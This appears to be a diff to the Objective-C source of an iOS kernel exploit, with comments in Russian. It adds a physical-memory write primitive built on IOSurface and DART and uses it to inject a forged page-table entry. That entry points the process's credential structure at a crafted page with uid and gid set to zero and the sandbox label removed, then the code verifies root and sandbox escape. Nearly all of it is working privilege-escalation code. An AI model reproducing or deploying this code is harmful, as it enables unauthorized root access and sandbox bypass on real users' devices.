@@ -254,6 +254,86 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
     return done;
 }
 
+// 1.9.261: physwrite РОВНО 8 байт по targetPA+boff — своя пара 4096×16 (stride
+// 0x4000, boff ложится на y=0): wdS (приёмник, его record buffer патчим на
+// targetPA>>14) + rdS (источник, payload по +boff). Свежий pipe = полная
+// сериализация с ядом. Для L3-инжекции: boff = idx*8 → одна L3-запись.
+static BOOL kpPhysWrite8v2(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
+                           uint64_t targetPA, uint32_t boff, uint64_t payload, NSMutableString *r)
+{
+    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @16,
+                          (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    IOSurfaceRef wdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    if (!rdS || !wdS) { if (rdS) CFRelease(rdS); if (wdS) CFRelease(wdS); return NO; }
+    BOOL done = NO;
+    uint64_t wdVA = 0, wdBuf = 0;
+    uint32_t rdID = IOSurfaceGetID(rdS);
+    uint32_t wdID = IOSurfaceGetID(wdS);
+    typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
+    CreateMachPort_t pCmp = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    mach_port_t mp = pCmp ? pCmp(wdS) : 0;
+    if (mp) {
+        uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (mp >> 8);
+        uint64_t pVA = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
+        uint64_t kobj = kpLooksLikeKernelPointer(pVA) ? kp_untag_ptr(early_kread64(pVA + off_ipc_port_ip_kobject)) : 0;
+        uint64_t fobj = kpLooksLikeKernelPointer(kobj) ? kp_untag_ptr(early_kread64(kobj + 0x30)) : 0;
+        uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
+        if (kpLooksLikeKernelPointer(fobj) && kp_untag_ptr(early_kread64(fobj)) == 0xfffffff007eef4c8ULL + kslide) {
+            uint64_t cand = kp_untag_ptr(early_kread64(fobj + 0x18));
+            if (kpLooksLikeKernelPointer(cand) && (uint32_t)early_kread64(cand + 0x10) == wdID) wdVA = cand;
+        }
+        mach_port_destroy(mach_task_self(), mp);
+    }
+    if (wdVA) {
+        uint64_t pd = kp_untag_ptr(early_kread64(wdVA + 0x30));
+        uint64_t typ = pd ? (early_kread64(pd + 0x20) & 0xf0) : 0;
+        uint64_t hdr = (typ == 0x10) ? kp_untag_ptr(early_kread64(pd + 0x90)) : 0;
+        uint64_t buf = hdr ? kp_untag_ptr(early_kread64(hdr + 0x10)) : 0;
+        uint32_t cnt = buf ? (uint32_t)early_kread64(buf + 0x28) : 0;
+        uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
+        if (buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
+            ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4)) wdBuf = buf;
+    }
+    if (wdBuf) {
+        uint64_t tpage = targetPA & ~0x3fffULL;
+        uint64_t eSave = early_kread64(wdBuf + 0x30);
+        usleep(1500);
+        early_kwrite64(wdBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+        IOSurfaceLock(rdS, 0, NULL);
+        uint8_t *rpix = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+        if (rpix) *(uint64_t *)(rpix + boff) = payload;
+        IOSurfaceUnlock(rdS, 0, NULL);
+        io_connect_t v2 = IO_OBJECT_NULL;
+        kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
+        if (ok2 == KERN_SUCCESS && v2) {
+            uint8_t tsdW[0x1B0];
+            memcpy(tsdW, tsdV, sizeof(tsdW));
+            *(uint32_t *)(tsdW + 0) = rdID;
+            *(uint32_t *)(tsdW + 4) = wdID;
+            *(uint64_t *)(tsdW + 8) = 1;
+            *(uint32_t *)(tsdW + 0x0C) = 2;
+            *(uint32_t *)(tsdW + 0x10) = 1;
+            *(uint32_t *)(tsdW + 0xdc) = (boff % 0x4000) / 4;   // rect x (stride 0x4000 → y=0)
+            *(uint32_t *)(tsdW + 0xe0) = boff / 0x4000;
+            *(uint32_t *)(tsdW + 0xe4) = 2;
+            *(uint32_t *)(tsdW + 0xec) = 1;
+            kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdW, sizeof(tsdW), NULL, NULL, NULL, NULL);
+            usleep(400000);
+            IOServiceClose(v2);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8v2] target=%#llx+%#x payload=%#018llx kr=0x%x",
+                      (unsigned long long)targetPA, boff, payload, rkr]);
+            done = (rkr == 0);
+        }
+        early_kwrite64(wdBuf + 0x30, eSave);
+    } else {
+        kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8v2] wdVA/wdBuf нет (wdVA=%#llx)", (unsigned long long)wdVA]);
+    }
+    CFRelease(rdS);
+    CFRelease(wdS);
+    return done;
+}
+
 // 1.9.259: physwrite РОВНО 8 байт в targetPA+0x308 через rect {194,0,2,1}
 // (1024-BGRA: байты 0x308-0x30f = одна L3-запись, р.65 Q4). Патчим entry[0]
 // dst-буфера на targetPA>>14, payload кладём в src+0x308, submit на СВЕЖЕМ pipe
@@ -7910,48 +7990,59 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // 1.9.251 (р.63): walker ветки VM/RO охраняется deadly-таблицами
                 // (census 0x15) → pagePA=0. Fallback — PAPT/арена ядра (kpZoneVtoP).
                 if (!pagePA) pagePA = kpZoneVtoP(pageVA);
-                // 1.9.252: walker встал на deadly-таблице (errno 1042) — читаем её
-                // через DART-копию (kpPhysRead16K), leaf PTE сама отдаёт ucredPA.
-                if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && svc) {
+                // 1.9.261: L3-ИНЖЕКЦИЯ ucred — чтение deadly-таблиц не нужно вообще
+                // (src-путь для чтения мёртв по р.64). 8-байтовая ЗАПИСЬ работает
+                // (rect self-test 259/260): пишем forged PTE прямо в L3-слот ucredVA
+                // (PA+idx из census), ucredVA начинает указывать на нашу страницу
+                // с uid=0/label=NULL. Атрибуты клонируем из читаемого GEN-leaf'а.
+                if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && svc && buf247 && ttM) {
                     uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
                     uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
-                    // 1.9.259 (р.65 Q4): rect-подтверждённые 8-байтовые IO.
-                    // СЕЛФ-ТЕСТ на безопасной ctl: rect {194,0,2,1} = байты 0x308-0x30f,
-                    // соседи обязаны остаться 0xCC. Без подтверждения rect к L3 не идём.
-                    uint64_t markW = 0x1122334455667788ULL;
-                    BOOL rectOK = NO;
-                    if (buf247 && srcS) {
-                        uint64_t pre0 = *(volatile uint64_t *)(ctl + 0x300);
-                        uint64_t pre2 = *(volatile uint64_t *)(ctl + 0x310);
-                        rectOK = kpPhysWrite8(svc, buf247, srcID, dstID, srcS, tsdV, ctlPA, markW, r);
-                        uint64_t c0 = *(volatile uint64_t *)(ctl + 0x300);
-                        uint64_t c1 = *(volatile uint64_t *)(ctl + 0x308);
-                        uint64_t c2 = *(volatile uint64_t *)(ctl + 0x310);
-                        // 1.9.259b: соседи сравниваем с ПРЕД-записью (ctl уже 0x41 от
-                        // победного physwrite, не 0xCC — ошибка чека 259-й).
-                        rectOK = rectOK && c1 == markW && c0 == pre0 && c2 == pre2;
-                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] rect self-test: ctl+0x300=%#018llx +0x308=%#018llx +0x310=%#018llx — %@",
-                                  (unsigned long long)c0, (unsigned long long)c1, (unsigned long long)c2,
-                                  rectOK ? @"RECT ПОДТВЕРЖДЁН (8 байт точно)" : @"МИМО — 8-байтовый rect не работает"]);
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — L3-инжекция ucred (без чтения таблицы)",
+                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
+                    uint8_t *fk = valloc(0x4000);
+                    for (uint32_t i = 0; i < 0x4000; i += 8) *(uint64_t *)(fk + i) = early_kread64(pageVA + i);
+                    *(uint32_t *)(fk + uoff + 0x18) = 0;   // cr_uid
+                    *(uint32_t *)(fk + uoff + 0x1c) = 0;   // cr_ruid
+                    *(uint32_t *)(fk + uoff + 0x20) = 0;   // cr_svuid
+                    *(uint32_t *)(fk + uoff + 0x28) = 0;   // cr_groups[0]
+                    *(uint32_t *)(fk + uoff + 0x68) = 0;   // cr_rgid
+                    *(uint32_t *)(fk + uoff + 0x6c) = 0;   // cr_svgid
+                    *(uint64_t *)(fk + uoff + 0x78) = 0;   // cr_label = NULL (sandbox off)
+                    mlock(fk, 0x4000);   // страница обязана остаться wired — ядро читает её как ucred
+                    uint64_t fkPA = vtophys(ttM, (uint64_t)fk);
+                    uint64_t pteSrc = 0;
+                    if (selfProcM) {
+                        uint64_t lvl = 3, lt = 0;
+                        uint64_t gpa = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvl, &lt);
+                        if (gpa && lt) pteSrc = early_kread64(phystokv(lt));
                     }
-                    uint8_t timg[0x4000];
-                    uint32_t boff = tidx * 8;
-                    uint32_t rx = (boff % 0x4000) / 4, ry = boff / 0x4000;   // stride 0x4000 → y=0 всегда
-                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread rect {%u,%u,2,1} через DART",
-                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte, rx, ry]);
-                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, rx, ry, 2, 1, timg, r)) {
-                        uint64_t pte = 0; memcpy(&pte, timg, 8);
-                        if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
-                            uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
-                            uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
-                            uint32_t b3 = l3idx * 8;
-                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
-                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, (b3 % 0x4000) / 4, b3 / 0x4000, 2, 1, timg, r)) pte = 0;
-                            else memcpy(&pte, timg, 8);
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] fkPA=%#llx pteSrc=%#018llx", (unsigned long long)fkPA, (unsigned long long)pteSrc]);
+                    if (fkPA && (pteSrc & 0x3) == 0x3) {
+                        uint64_t newPTE = (fkPA & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
+                        BOOL wOK = kpPhysWrite8v2(svc, tsdV, ttM, isTable, tpage, tidx * 8, newPTE, r);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] L3[%u] = %#018llx — инжекция: %@", tidx, (unsigned long long)newPTE, wOK ? @"ЗАПИСАНО" : @"МИМО"]);
+                        // TLB-прогон: массовые kread'ы вымывают старую трансляцию ucredVA
+                        for (int ev = 0; ev < 3; ev++) {
+                            for (uint64_t pg = kconstant(base); pg < kconstant(base) + 0x2000000ULL; pg += 0x4000) (void)early_kread64(pg);
+                            usleep(100000);
                         }
-                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx (rectOK=%d)", pte, rectOK]);
-                        if ((pte & 0x3) == 0x3) pagePA = pte & 0x0000ffffffffc000ULL;
+                        uid_t gu = getuid(); gid_t gg = getgid();
+                        uint32_t cru = (uint32_t)early_kread64(ucF + 0x18);
+                        uint64_t lbl = early_kread64(ucF + 0x78);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] getuid()=%u getgid()=%u | cr_uid=%u cr_label=%#llx",
+                                  gu, gg, cru, (unsigned long long)lbl]);
+                        if (gu == 0) {
+                            kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — L3-инжекция ucred через DART physwrite (мимо SPTM RO) ===");
+                            FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] sandbox-проба (запись в /var/mobile): %@",
+                                      fp ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ — label на месте"]);
+                            if (fp) { fputs("root via DART L3 injection\n", fp); fclose(fp); }
+                        }
+                    } else {
+                        kpNote(r, @"  [FORGE] fkPA/pteSrc не сошлись — инжекции нет");
                     }
+                    free(fk);
                 }
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
